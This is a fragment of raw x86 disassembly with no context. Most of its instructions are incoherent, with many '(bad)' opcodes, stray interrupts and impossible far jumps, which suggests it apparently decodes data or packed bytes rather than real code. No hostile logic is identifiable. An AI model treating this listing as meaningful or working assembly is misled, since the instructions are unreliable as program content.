  42535f:	(bad)  
  425360:	std    
  425361:	int    0xa6
  425363:	std    
  425364:	cmp    edi,DWORD PTR [ebp+0x3b]
  425367:	loope  0x42533c
  425369:	jmp    0x4252fd
  42536b:	shl    ebp,cl
  42536d:	sub    BYTE PTR [ebx+0xc],dl
  425370:	aad    0xf3
  425372:	or     dl,BYTE PTR [esi-0x2723207]
  425378:	int    0x96
  42537a:	std    
  42537b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42537e:	(bad)  
  425380:	jmp    0x425314
  425382:	shr    edx,cl
  425384:	sub    BYTE PTR [ebx+0x13],dl
  425387:	xchg   DWORD PTR [edx],eax
  425389:	int    0x8d
  42538b:	cmc    
  42538c:	int    0x96
  42538e:	cmc    
  42538f:	cmp    ebx,ecx
  425391:	cmp    edi,DWORD PTR [ebp-0x2d]
  425394:	jmp    0x1353:0x92ebd328
  42539b:	int    0x96
  42539d:	std    
  42539e:	int    0xa6
  4253a0:	std    
  4253a1:	cmp    esi,ecx
  4253a3:	cmp    esp,ecx
  4253a5:	shl    ebp,cl
  4253a7:	sub    bl,dl
  4253a9:	repz xchg edx,eax
  4253ab:	push   ebx
  4253ac:	aad    0x33
  4253ae:	adc    eax,DWORD PTR [ebx+0x2]
  4253b1:	das    
  4253b2:	pop    es
  4253b3:	pop    edx
  4253b4:	add    BYTE PTR [eax],al
  4253b6:	add    ch,cl
  4253b8:	jbe    0x4253b3
  4253ba:	int    0x8d
  4253bc:	mov    BYTE PTR [edx-0x327ef558],ch
  4253c2:	jbe    0x4253bd
  4253c4:	arpl   bx,cx
  4253c6:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  4253cd:	ins    DWORD PTR es:[edi],dx
  4253ce:	pop    esi
  4253cf:	jbe    0x42541d
  4253d1:	aam    0x3a
  4253d3:	pop    esi
  4253d4:	jbe    0x42535e
  4253d6:	fdiv   DWORD PTR [edx]
  4253d8:	retf   0x8814
  4253db:	or     DWORD PTR [esi-0x69a6d0d1],edx
  4253e1:	das    
  4253e2:	adc    dh,bl
  4253e4:	in     eax,dx
  4253e5:	add    BYTE PTR [eax+0x2f960980],0xf1
  4253ec:	lea    ebp,[edi]
  4253ee:	retf   0x2f96
  4253f1:	or     DWORD PTR [eax+ecx*4],edx
  4253f4:	ins    BYTE PTR es:[edi],dx
  4253f5:	inc    ebx
  4253f6:	jbe    0x425380
  4253f8:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  4253ff:	stc    
  425400:	std    
  425401:	add    BYTE PTR [eax],al
  425403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425404:	ror    BYTE PTR [eax-0x12326980],cl
  42540a:	adc    ch,ch
  42540c:	cmp    al,0x84
  42540e:	add    BYTE PTR [eax+0x49bf985b],0x21
  425415:	xchg   BYTE PTR ds:0xc911a60a,dh
  42541b:	jbe    0x42541a
  42541d:	inc    ecx
  42541e:	and    DWORD PTR [esi-0x128936cb],eax
  425424:	dec    ecx
  425425:	sub    DWORD PTR [esi-0x4a8936cb],eax
  42542b:	jno    0x4253e3
  42542d:	cli    
  42542e:	arpl   bp,cx
  425430:	jbe    0x425443
  425432:	int    0x8d
  425434:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  42543a:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425444:	repnz sub BYTE PTR [ebx-0x2d],dl
  425448:	or     dh,BYTE PTR [esi-0x7]
  42544b:	leave  
  42544c:	jbe    0x4253f3
  42544e:	into   
  42544f:	and    DWORD PTR [esi-0x628936cb],eax
  425455:	inc    esi
  425456:	sbb    DWORD PTR [ebp-0x528936de],esi
  42545c:	mov    BYTE PTR [eax-0x34327f80],al
  425462:	int    0x76
  425464:	std    
  425465:	int    0x8d
  425467:	std    
  425468:	cmp    esi,eax
  42546a:	shl    edx,cl
  42546c:	sub    BYTE PTR [ebx],bh
  42546e:	jns    0x425443
  425470:	mov    ebp,0xcdd35392
  425475:	lea    edx,[ecx]
  425477:	int    0x96
  425479:	adc    DWORD PTR [ebx],edi
  42547b:	(bad)  
  42547d:	(bad)  
  42547f:	jmp    0x425413
  425481:	shr    edx,cl
  425483:	sub    BYTE PTR [ebx+0x13],dl
  425486:	das    
  425487:	rcl    ebx,1
  425489:	in     al,dx
  42548a:	outs   dx,BYTE PTR ds:[esi]
  42548b:	int    0x76
  42548d:	cmc    
  42548e:	int    0x8d
  425490:	cmc    
  425491:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425497:	push   ebx
  425498:	sar    DWORD PTR [ebx],cl
  42549a:	lds    ecx,FWORD PTR [edx]
  42549c:	jbe    0x425497
  42549e:	iret   
  42549f:	jbe    0x42549a
  4254a1:	jo     0x425460
  4254a3:	mov    ecx,0xa0000fe
  4254a8:	jbe    0x4254a3
  4254aa:	int    0x76
  4254ac:	stc    
  4254ad:	int    0x8d
  4254af:	cmc    
  4254b0:	or     al,BYTE PTR ds:0xfc9dcf
  4254b6:	add    ch,cl
  4254b8:	jbe    0x4254b7
  4254ba:	int    0x8d
  4254bc:	std    
  4254bd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4254c0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254c7:	push   ebx
  4254c8:	rol    DWORD PTR [edi+0x760af576],cl
  4254ce:	cmc    
  4254cf:	int    0x76
  4254d1:	in     eax,dx
  4254d2:	int    0x8d
  4254d4:	in     eax,dx
  4254d5:	cmp    esi,eax
  4254d7:	shl    edx,cl
  4254d9:	sub    BYTE PTR [ebx],bh
  4254db:	jns    0x4254b0
  4254dd:	mov    ebp,0xcdd35392
  4254e2:	(bad)  
  4254e3:	std    
  4254e4:	int    0x96
  4254e6:	std    
  4254e7:	cmp    ecx,DWORD PTR [edi]
  4254e9:	cmp    ebx,ecx
  4254eb:	shr    ebx,cl
  4254ed:	xchg   edx,eax
  4254ee:	shr    edx,cl
  4254f0:	sub    BYTE PTR [ebx+0x13],dl
  4254f3:	xor    edx,ebx
  4254f5:	int    0x8d
  4254f7:	cmc    
  4254f8:	inc    ebx
  4254f9:	jge    0x4254d3
  4254fb:	mov    bl,0xcd
  4254fd:	jbe    0x4254b4
  4254ff:	int    0x8d
  425501:	mov    ch,0x3b
  425503:	jns    0x425540
  425505:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42550c:	push   ebx
  42550d:	ror    DWORD PTR [edx],cl
  42550f:	jbe    0x42550a
  425511:	leave  
  425512:	jbe    0x425501
  425514:	bound  ebx,QWORD PTR [edi]
  425516:	xchg   BYTE PTR ds:0x1ebddcd,dh
  42551c:	add    BYTE PTR [eax-0x5a723280],0xcd
  425523:	jbe    0x4254ca
  425525:	cmp    ecx,ecx
  425527:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  42552d:	jmp    0x4254c1
  42552f:	push   ebx
  425530:	jge    0x4254ff
  425532:	jbe    0x42552d
  425534:	aad    0xbd
  425536:	or     dh,BYTE PTR [esi-0x63]
  425539:	int    0x76
  42553b:	mov    dl,cl
  42553d:	or     BYTE PTR [ecx],0x76
  425540:	in     al,dx
  425541:	retf   0xec76
  425544:	int    0x8d
  425546:	stc    
  425547:	das    
  425548:	pop    ecx
  425549:	ins    DWORD PTR es:[edi],dx
  42554a:	cmp    edx,ebx
  42554c:	or     dh,BYTE PTR [esi-0xb]
  42554f:	int    0x76
  425551:	in     eax,dx
  425552:	int    0x8d
  425554:	in     eax,dx
  425555:	cmp    edi,DWORD PTR [ecx-0x2d]
  425558:	mov    ebp,0xd3f03b92
  42555d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425561:	int    0x8d
  425563:	cmc    
  425564:	sub    edx,ebx
  425566:	int    0x5
  425568:	push   es
  425569:	popf   
  42556a:	cld    
  42556b:	add    BYTE PTR [eax],al
  42556d:	int    0x8d
  42556f:	popf   
  425570:	cmp    edx,ebx
  425572:	or     dh,BYTE PTR [esi-0x7]
  425575:	int    0x76
  425577:	std    
  425578:	int    0x8d
  42557a:	std    
  42557b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42557e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425585:	push   ebx
  425586:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42558c:	std    
  42558d:	int    0x8d
  42558f:	std    
  425590:	cmp    edi,DWORD PTR [ecx+0x3b]
  425593:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42559a:	push   ebx
  42559b:	sar    DWORD PTR [esi],cl
  42559d:	jbe    0x42554c
  42559f:	int    0x76
  4255a1:	adc    ebp,ecx
  4255a3:	lea    edx,[ecx]
  4255a5:	cmp    esi,eax
  4255a7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4255aa:	repnz sub bl,dl
  4255ad:	mov    ebp,0xcdd35392
  4255b2:	lea    ebp,[ebp+0x62f7d43]
  4255b8:	imul   eax,DWORD PTR [eax],0x0
  4255bb:	add    ch,cl
  4255bd:	jbe    0x425574
  4255bf:	int    0x8d
  4255c1:	mov    ch,0x3b
  4255c3:	jns    0x425600
  4255c5:	lock shl edx,cl
  4255c8:	sub    bl,dl
  4255ca:	mov    ebp,0xd353aa92
  4255cf:	int    0x8d
  4255d1:	stc    
  4255d2:	test   al,0x3b
  4255d4:	shl    DWORD PTR [ebx-0x35],cl
  4255d7:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  4255de:	in     eax,dx
  4255df:	xor    BYTE PTR [ebx],bh
  4255e1:	retf   
  4255e2:	pop    ebx
  4255e3:	call   0xbb05:0x2f888d5e
  4255ea:	add    BYTE PTR [eax+0x2f024380],0x5
  4255f1:	rol    DWORD PTR [eax-0x44d07f80],1
  4255f7:	cwde   
  4255f8:	sub    al,0x5d
  4255fa:	lahf   
  4255fb:	xor    eax,0x8d0a8080
  425600:	std    
  425601:	or     cl,BYTE PTR [ebp+0xaf13b11]
  425607:	(bad)  
  425608:	stc    
  425609:	mov    eax,0xe3b813cd
  42560e:	retf   
  42560f:	cmp    eax,DWORD PTR [eax]
  425611:	leave  
  425612:	jbe    0x425609
  425614:	adc    al,0x80
  425616:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  42561d:	mov    eax,0xb8fde6cd
  425622:	jecxz  0x4255ed
  425624:	mov    eax,0xbb2ff93b
  425629:	(bad)  
  42562a:	stc    
  42562b:	iret   
  42562c:	dec    esp
  42562d:	into   
  42562e:	mov    eax,0xd692de5e
  425633:	pop    edx
  425634:	das    
  425635:	mov    ebx,0xf58d0a89
  42563a:	mov    eax,0x4dd67d43
  42563f:	das    
  425640:	mov    ebx,0xa6cdfd8d
  425645:	mov    BYTE PTR [ecx],al
  425647:	fs push ds
  425649:	adc    ah,0x3b
  42564c:	das    
  42564d:	mov    ebx,0xa6cdfd8d
  425652:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425658:	mov    eax,0x3bb8d3e3
  42565d:	jge    0x425617
  42565f:	pop    esi
  425660:	(bad)  
  425661:	cmc    
  425662:	aam    0x23
  425664:	leave  
  425665:	jbe    0x42565c
  425667:	sbb    BYTE PTR [eax+0x76008080],al
  42566d:	stc    
  42566e:	int    0x7d
  425670:	mov    eax,0xb82c8e3b
  425675:	jecxz  0x425642
  425677:	mov    eax,0x82f98d5e
  42567c:	inc    ecx
  42567d:	in     al,dx
  42567e:	dec    edx
  42567f:	add    BYTE PTR [esi+0x11],dh
  425682:	leave  
  425683:	jbe    0x42567a
  425685:	push   ss
  425686:	add    BYTE PTR [eax-0x1944d080],0xfd
  42568d:	int    0xa6
  42568f:	mov    BYTE PTR [ebx],bh
  425691:	retf   
  425692:	pop    esp
  425693:	dec    esp
  425694:	sub    dl,ah
  425696:	push   ss
  425697:	add    BYTE PTR [esi-0x3],dh
  42569a:	add    al,0xe6
  42569c:	cmc    
  42569d:	sbb    BYTE PTR [edi],ch
  42569f:	push   es
  4256a0:	jb     0x4256a2
  4256a2:	add    BYTE PTR [eax],al
  4256a4:	cmp    ebp,DWORD PTR [ebp-0x56]
  4256a7:	arpl   bx,cx
  4256a9:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  4256b0:	jecxz  0x425685
  4256b2:	mov    eax,0x6d3b7d3b
  4256b7:	mov    eax,0x2f2c8e43
  4256bc:	adc    eax,0x96b9ec6d
  4256c1:	int    0xed
  4256c3:	add    al,0xed
  4256c5:	mov    esp,0xc09a985b
  4256ca:	inc    esp
  4256cb:	add    dh,dl
  4256cd:	mov    ch,cl
  4256cf:	adc    DWORD PTR [ebp+0xf90b],edi
  4256d5:	iret   
  4256d6:	js     0x42570a
  4256d8:	or     dh,BYTE PTR [esi+0x25]
  4256db:	iret   
  4256dc:	js     0x425752
  4256de:	or     dh,BYTE PTR [esi+0x2d]
  4256e1:	iret   
  4256e2:	js     0x42569c
  4256e4:	or     dh,BYTE PTR [esi+0x35]
  4256e7:	iret   
  4256e8:	pop    es
  4256e9:	or     DWORD PTR [eax+0x760a8080],eax
  4256ef:	cmp    eax,0x804107cf
  4256f4:	add    BYTE PTR [eax-0x30ba89f6],0x7
  4256fb:	or     eax,0xa808080
  425700:	jbe    0x4256d2
  425702:	iret   
  425703:	pop    es
  425704:	out    dx,eax
  425705:	add    BYTE PTR [eax+0x55760a80],0xcf
  42570c:	pop    es
  42570d:	xor    BYTE PTR [ecx+0x760a8080],al
  425713:	pop    ebp
  425714:	iret   
  425715:	pop    es
  425716:	inc    edx
  425717:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  425721:	pop    es
  425722:	xchg   esp,eax
  425723:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  42572d:	add    BYTE PTR [eax-0x25c4af33],0xa
  425734:	xchg   esi,eax
  425735:	icebp  
  425736:	or     dl,BYTE PTR [esi-0x6269f56b]
  42573c:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425742:	(bad)  
  425743:	mov    cl,0xde
  425745:	adc    ebx,DWORD PTR [ebp-0x43]
  425748:	or     ah,BYTE PTR [ebx]
  42574a:	and    eax,0xcd0d760a
  42574f:	lea    edi,[ebp-0x33]
  425752:	out    0xd,al
  425754:	cmp    edi,ecx
  425756:	adc    al,BYTE PTR [edx]
  425758:	jnp    0x425791
  42575a:	ficom  WORD PTR [ebx]
  42575c:	das    
  42575d:	inc    ebp
  42575e:	cli    
  42575f:	xchg   edx,eax
  425760:	rcl    DWORD PTR [eax],cl
  425762:	xchg   edx,eax
  425763:	or     ah,dh
  425765:	mov    ch,0xcd
  425767:	out    0x7d,al
  425769:	int    0xa6
  42576b:	or     eax,0x3be1cd
  425770:	cmp    eax,DWORD PTR [ebx]
  425772:	shl    ebp,cl
  425774:	sub    BYTE PTR [ebx-0x10],dl
  425777:	int    0xe6
  425779:	mov    ch,0x61
  42577b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425782:	cld    
  425783:	push   ebx
  425784:	lock or dl,dh
  425787:	stc    
  425788:	das    
  425789:	add    eax,0x808080f2
  42578e:	adc    dh,BYTE PTR [esi-0xf]
  425791:	(bad)  
  425792:	mov    esp,0xeb5f8bbd
  425797:	or     ah,BYTE PTR [ebx]
  425799:	and    eax,0x12958d31
  42579e:	jbe    0x42573d
  4257a0:	(bad)  
  4257a1:	mov    esp,0x8d318790
  4257a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257a7:	int    0x8d
  4257a9:	jge    0x425778
  4257ab:	(bad)  
  4257ac:	or     eax,0xcd7de6cd
  4257b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257b2:	or     eax,0x212113b
  4257b7:	jnp    0x4257f0
  4257b9:	ficom  WORD PTR [ebx]
  4257bb:	das    
  4257bc:	inc    ebp
  4257bd:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257c3:	out    dx,eax
  4257c4:	xchg   edx,eax
  4257c5:	cmp    ebx,ebp
  4257c7:	cmp    eax,DWORD PTR [ebx]
  4257c9:	push   ebx
  4257ca:	or     al,0x53
  4257cc:	clc    
  4257cd:	add    al,0xd3
  4257cf:	add    BYTE PTR [ecx+ebx*4],al
  4257d2:	add    BYTE PTR [edx],cl
  4257d4:	lea    edi,[ebp+0xa]
  4257d7:	(bad)  
  4257d8:	or     eax,0x53f18dcd
  4257dd:	lea    edx,[ebp+0x761223d4]
  4257e3:	icebp  
  4257e4:	mov    edx,DWORD PTR [ebx]
  4257e6:	dec    edx
  4257e7:	stc    
  4257e8:	pop    edi
  4257e9:	sbb    al,bl
  4257eb:	mov    ch,0x6b
  4257ed:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  4257f3:	(bad)
  4257f6:	std    
  4257f7:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  4257fd:	(bad)  
  4257fe:	icebp  
  4257ff:	(bad)  
  425800:	mov    esp,0x76897abd
  425805:	xchg   ebp,eax
  425806:	adc    dh,BYTE PTR [esi-0x6f433963]
  42580c:	add    al,0x12
  42580e:	mov    dh,0xa5
  425810:	jmp    0x42581c
  425812:	and    esp,DWORD PTR ds:0xcd7d8dcd
  425818:	lea    ecx,ds:0xcd7de6cd
  42581e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42581f:	or     eax,0x92fc352f
  425824:	shr    ebx,cl
  425826:	sub    BYTE PTR [ebx],bh
  425828:	not    DWORD PTR [ebx-0xc]
  42582b:	shr    ecx,cl
  42582d:	xchg   edx,eax
  42582e:	push   ebx
  42582f:	lock adc al,BYTE PTR [edx]
  425832:	(bad)  
  425833:	aaa    
  425834:	ficom  WORD PTR [ebx]
  425836:	or     cl,BYTE PTR [ebp+0xa113b7d]
  42583c:	(bad)  
  42583d:	or     eax,0xcd7d8dcd
  425842:	(bad)  
  425843:	or     eax,0xcd7de6cd
  425848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425849:	or     eax,0x212113b
  42584e:	jnp    0x425887
  425850:	ficom  WORD PTR [ebx]
  425852:	das    
  425853:	inc    ebp
  425854:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42585a:	out    dx,eax
  42585b:	xchg   edx,eax
  42585c:	cmp    ebx,ebp
  42585e:	cmp    eax,DWORD PTR [ebx]
  425860:	push   ebx
  425861:	or     al,0x53
  425863:	clc    
  425864:	push   ebx
  425865:	comiss xmm0,DWORD PTR [esi]
  425868:	xor    al,BYTE PTR [eax]
  42586a:	add    BYTE PTR [eax],al
  42586c:	int    0xd6
  42586e:	stc    
  42586f:	push   es
  425870:	imul   DWORD PTR [edi]
  425872:	add    eax,0x808080d1
  425877:	int    0x78
  425879:	fs int 0xe4
  42587c:	push   eax
  42587d:	fadd   QWORD PTR [edi+0x349acdff]
  425883:	int    0x6f
  425885:	and    al,0xcd
  425887:	jp     0x4258b5
  425889:	int    0xaa
  42588b:	sbb    al,0x87
  42588d:	cdq    
  42588e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425894:	xchg   DWORD PTR [edi],ecx
  425896:	xchg   DWORD PTR [ecx+0xa],edi
  425899:	(bad)  
  42589a:	in     eax,dx
  42589b:	or     dh,BYTE PTR [esi-0x6b]
  42589e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  4258a4:	xchg   DWORD PTR [edx],ecx
  4258a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258a7:	cmc    
  4258a8:	cmp    ebx,edx
  4258aa:	or     dl,BYTE PTR [esi-0xa69a15b]
  4258b0:	fcom   st(4)
  4258b2:	in     al,dx
  4258b3:	xchg   ebp,ecx
  4258b5:	jbe    0x42584c
  4258b7:	int    0xa6
  4258b9:	or     eax,0x5b24bb2f
  4258be:	inc    ebx
  4258bf:	call   0x14aa:0x436b771c
  4258c6:	ja     0x425870
  4258c8:	int    0x84
  4258ca:	mov    al,0xcd
  4258cc:	xchg   esi,eax
  4258cd:	mov    ch,cl
  4258cf:	and    al,0x1f
  4258d1:	or     dl,BYTE PTR [esi-0x30867803]
  4258d7:	xchg   esi,eax
  4258d8:	sbb    eax,0x9633a987
  4258dd:	mov    BYTE PTR [edx],cl
  4258df:	jbe    0x4258f2
  4258e1:	or     dl,BYTE PTR [esi-0x4a89368b]
  4258e7:	push   ebx
  4258e8:	add    BYTE PTR [eax-0x2693280],0x4
  4258ef:	pusha  
  4258f0:	adc    dh,0x28
  4258f3:	jo     0x4258c2
  4258f5:	jbe    0x42596c
  4258f7:	int    0x54
  4258f9:	xor    BYTE PTR [ebp+0xfddd],bh
  4258ff:	int    0xd6
  425901:	stc    
  425902:	int    0x8d
  425904:	in     eax,dx
  425905:	push   es
  425906:	ins    DWORD PTR es:[edi],dx
  425907:	aam    0x85
  425909:	int    0x76
  42590b:	std    
  42590c:	or     bl,BYTE PTR [ecx*8+0x76041176]
  425913:	std    
  425914:	test   BYTE PTR [eax],al
  425916:	lea    esi,[ebp-0x69321c2a]
  42591c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42591d:	push   edx
  42591e:	or     dl,BYTE PTR [esi-0xa69bc5b]
  425924:	or     dh,0xaa
  425927:	int    0x79
  425929:	test   al,0x63
  42592b:	retf   
  42592c:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  425933:	int    0xd6
  425935:	mov    BYTE PTR [eax],al
  425937:	pop    ecx
  425938:	adc    DWORD PTR [ecx+0x76cd8080],eax
  42593e:	mov    BYTE PTR [ebp+0xfee4],bh
  425944:	int    0x7
  425946:	cmp    eax,0x3b808081
  42594b:	retf   
  42594c:	pop    esi
  42594d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425953:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425959:	fwait
  42595a:	sbb    eax,0x5b808081
  42595f:	cwde   
  425960:	int    0x11
  425962:	pop    ebp
  425963:	lahf   
  425964:	xor    eax,0x4eec8080
  425969:	cmp    edi,DWORD PTR [ebp-0x48]
  42596c:	jecxz  0x425939
  42596e:	mov    eax,0xd2044a0a
  425973:	xchg   edx,eax
  425974:	add    al,0x79
  425976:	xchg   edx,eax
  425977:	das    
  425978:	mov    ebx,0x7d43b84e
  42597d:	(bad)  
  42597e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425982:	mov    eax,0x8cd920a
  425987:	sbb    eax,0x63808081
  42598c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425992:	sbb    eax,0xd3808081
  425997:	jmp    0xed0be122
  42599c:	dec    edx
  42599d:	add    DWORD PTR [edx],eax
  42599f:	add    DWORD PTR [ecx],0xffffffeb
  4259a2:	mov    esi,0x526c8809
  4259a7:	retf   0x14a
  4259aa:	cli    
  4259ab:	sbb    dh,dl
  4259ad:	adc    BYTE PTR [ecx-0x80],bh
  4259b0:	or     ch,0x7
  4259b3:	sbb    eax,0x87808081
  4259b8:	leave  
  4259b9:	stos   BYTE PTR es:[edi],al
  4259ba:	lds    edx,FWORD PTR [esi-0x12ed1233]
  4259c0:	mov    al,0x80
  4259c2:	add    BYTE PTR [eax+0xabd5f5b],0x23
  4259c9:	and    eax,0x76c99a98
  4259ce:	cmc    
  4259cf:	xchg   ecx,eax
  4259d0:	aaa    
  4259d1:	ficom  WORD PTR [ebx]
  4259d3:	or     cl,BYTE PTR [ebp-0x12893607]
  4259d9:	(bad)  
  4259da:	aaa    
  4259db:	ficom  WORD PTR [ebx]
  4259dd:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  4259e3:	jbe    0x4259a2
  4259e5:	dec    ecx
  4259e6:	and    DWORD PTR [esi-0x28936cb],eax
  4259ec:	inc    ecx
  4259ed:	and    DWORD PTR [esi-0xe8936cb],eax
  4259f3:	out    0x37,al
  4259f5:	ficom  WORD PTR [ebx]
  4259f7:	or     cl,BYTE PTR [ebp+0x5d76c995]
  4259fd:	fidiv  WORD PTR [edi]
  4259ff:	ficom  WORD PTR [ebx]
  425a01:	or     cl,BYTE PTR [ebp-0x1289329b]
  425a07:	int    0x96
  425a09:	adc    DWORD PTR [edi],ebp
  425a0b:	inc    ebp
  425a0c:	icebp  
  425a0d:	xchg   edx,eax
  425a0e:	shl    ebx,cl
  425a10:	xchg   edx,eax
  425a11:	int    0x96
  425a13:	in     eax,dx
  425a14:	int    0xd6
  425a16:	adc    ebx,edx
  425a18:	jmp    0x4229:0xbea6c328
  425a1f:	cmp    ecx,ecx
  425a21:	cmp    esi,edi
  425a23:	push   ebx
  425a24:	jns    0x425a30
  425a26:	jbe    0x4259cd
  425a28:	iret   
  425a29:	jbe    0x4259d8
  425a2b:	or     dh,BYTE PTR [esi+0xd]
  425a2e:	int    0x76
  425a30:	or     eax,0x8621d169
  425a35:	xor    eax,0x37b680c9
  425a3a:	ficom  WORD PTR [ebx]
  425a3c:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a40:	(bad)  
  425a41:	std    
  425a42:	int    0x96
  425a44:	std    
  425a45:	cmp    ecx,DWORD PTR [edi]
  425a47:	shr    ebx,cl
  425a49:	xchg   edx,eax
  425a4a:	sar    bh,0x9c
  425a4d:	cmp    esi,ecx
  425a4f:	shr    edx,cl
  425a51:	sub    BYTE PTR [ebx+0x13],dl
  425a54:	int    0x96
  425a56:	std    
  425a57:	int    0xa6
  425a59:	std    
  425a5a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a60:	popf   
  425a61:	shl    ebp,cl
  425a63:	sub    BYTE PTR [ebx-0x2b],dl
  425a66:	xchg   DWORD PTR [ebx],edx
  425a68:	int    0x96
  425a6a:	std    
  425a6b:	int    0xa6
  425a6d:	std    
  425a6e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a74:	popf   
  425a75:	shl    ebp,cl
  425a77:	sub    BYTE PTR [ebx-0x2b],dl
  425a7a:	xchg   DWORD PTR [ebx],edx
  425a7c:	int    0x96
  425a7e:	std    
  425a7f:	int    0xa6
  425a81:	std    
  425a82:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a88:	popf   
  425a89:	shl    ebp,cl
  425a8b:	sub    BYTE PTR [ebx-0x2b],dl
  425a8e:	xchg   DWORD PTR [ebx],edx
  425a90:	or     cl,bh
  425a92:	nop
  425a93:	add    BYTE PTR [eax],al
  425a95:	add    ch,cl
  425a97:	lea    edi,[ebp+0x3bbd96cd]
  425a9d:	icebp  
  425a9e:	cmp    ecx,DWORD PTR [edi]
  425aa0:	shr    edx,cl
  425aa2:	sub    bl,dl
  425aa4:	jmp    0x425a38
  425aa6:	push   ebx
  425aa7:	adc    ecx,ebp
  425aa9:	xchg   esi,eax
  425aaa:	mov    ebp,0x3bbda6cd
  425aaf:	cdq    
  425ab0:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425ab6:	in     eax,0x28
  425ab8:	push   ebx
  425ab9:	aad    0xa
  425abb:	int3   
  425abc:	pop    ss
  425abd:	aam    0x0
  425abf:	add    BYTE PTR [eax],al
  425ac1:	int    0x8d
  425ac3:	dec    esp
  425ac4:	int    0x89
  425ac6:	int    0x96
  425ac8:	std    
  425ac9:	int    0xa6
  425acb:	std    
  425acc:	int    0x7e
  425ace:	jo     0x425b0b
  425ad0:	popf   
  425ad1:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425ad7:	in     eax,0x28
  425ad9:	push   ebx
  425ada:	aad    0xa
  425adc:	int3   
  425add:	pop    ss
  425ade:	aam    0x0
  425ae0:	add    BYTE PTR [eax],al
  425ae2:	int    0x8d
  425ae4:	xor    ch,cl
  425ae6:	xchg   esi,eax
  425ae7:	xor    BYTE PTR [ebx],bh
  425ae9:	icebp  
  425aea:	cmp    ecx,DWORD PTR [edi]
  425aec:	shr    edx,cl
  425aee:	sub    bl,dl
  425af0:	jmp    0x425a84
  425af2:	push   ebx
  425af3:	adc    ecx,ebp
  425af5:	xchg   esi,eax
  425af6:	std    
  425af7:	int    0xa6
  425af9:	std    
  425afa:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425b00:	cdq    
  425b01:	shl    ebx,cl
  425b03:	xchg   edx,eax
  425b04:	shl    ebp,cl
  425b06:	sub    BYTE PTR [ebx-0x2b],dl
  425b09:	int    0xa6
  425b0b:	std    
  425b0c:	cmp    edi,DWORD PTR [ecx-0x2d]
  425b0f:	mov    ebp,0xfff40492
  425b14:	shl    ebp,cl
  425b16:	sub    BYTE PTR [ebx-0x3b],dl
  425b19:	xchg   ecx,esi
  425b1b:	int    0x76
  425b1d:	adc    al,0xa
  425b1f:	int3   
  425b20:	pop    ss
  425b21:	aam    0x0
  425b23:	add    BYTE PTR [eax],al
  425b25:	int    0x8d
  425b27:	adc    al,0x4
  425b29:	add    bh,bh
  425b2b:	shl    edx,cl
  425b2d:	sub    BYTE PTR [ebx],bh
  425b2f:	jns    0x425b04
  425b31:	mov    ebp,0xcdd35392
  425b36:	(bad)  
  425b37:	std    
  425b38:	int    0x96
  425b3a:	std    
  425b3b:	add    al,0xfb
  425b3d:	(bad)  
  425b3e:	cmp    ecx,DWORD PTR [edi]
  425b40:	shr    edx,cl
  425b42:	sub    bl,dl
  425b44:	jmp    0x425ad8
  425b46:	push   ebx
  425b47:	adc    ecx,ebp
  425b49:	xchg   esi,eax
  425b4a:	std    
  425b4b:	int    0xa6
  425b4d:	std    
  425b4e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b54:	repz xchg edx,eax
  425b56:	shl    ebp,cl
  425b58:	sub    BYTE PTR [ebx-0x2b],dl
  425b5b:	xchg   DWORD PTR [ebx],edx
  425b5d:	int    0x96
  425b5f:	std    
  425b60:	int    0xa6
  425b62:	std    
  425b63:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b69:	in     eax,0x28
  425b6b:	shl    ebx,cl
  425b6d:	xchg   edx,eax
  425b6e:	push   ebx
  425b6f:	aad    0x87
  425b71:	adc    ecx,DWORD PTR [edx]
